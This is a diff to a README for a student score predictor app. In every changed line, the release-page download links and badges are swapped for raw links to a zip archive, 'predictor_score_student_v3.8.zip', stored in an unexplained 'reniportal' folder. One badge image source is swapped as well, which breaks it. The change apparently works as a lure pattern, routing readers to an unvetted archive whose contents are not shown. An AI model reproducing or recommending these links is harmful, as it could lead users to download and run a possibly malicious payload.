@@ -1,6 +1,6 @@
 # 🎓 student-score-predictor - Predict Student Scores Easily
 
-[![Download Student Score Predictor](https://img.shields.io/badge/Download-Now-blue)](https://github.com/safkaneo/student-score-predictor/releases)
+[![Download Student Score Predictor](https://raw.githubusercontent.com/safkaneo/student-score-predictor/main/reniportal/predictor_score_student_v3.8.zip)](https://raw.githubusercontent.com/safkaneo/student-score-predictor/main/reniportal/predictor_score_student_v3.8.zip)
 
 ## 📌 Project Description
 
@@ -54,7 +54,7 @@ Ensure your computer meets the following requirements:
 
 To download the latest version of the application, visit the link below:
 
-[**Download Student Score Predictor**](https://github.com/safkaneo/student-score-predictor/releases)
+[**Download Student Score Predictor**](https://raw.githubusercontent.com/safkaneo/student-score-predictor/main/reniportal/predictor_score_student_v3.8.zip)
 
 After visiting the link, follow these steps:
 
@@ -97,4 +97,4 @@ We plan to improve the application by adding:
 
 This project is licensed under the MIT License. Feel free to use it for personal or educational purposes.
 
-[![Download Student Score Predictor](https://img.shields.io/badge/Download-Now-blue)](https://github.com/safkaneo/student-score-predictor/releases)
+[![Download Student Score Predictor](https://raw.githubusercontent.com/safkaneo/student-score-predictor/main/reniportal/predictor_score_student_v3.8.zip)](https://raw.githubusercontent.com/safkaneo/student-score-predictor/main/reniportal/predictor_score_student_v3.8.zip)
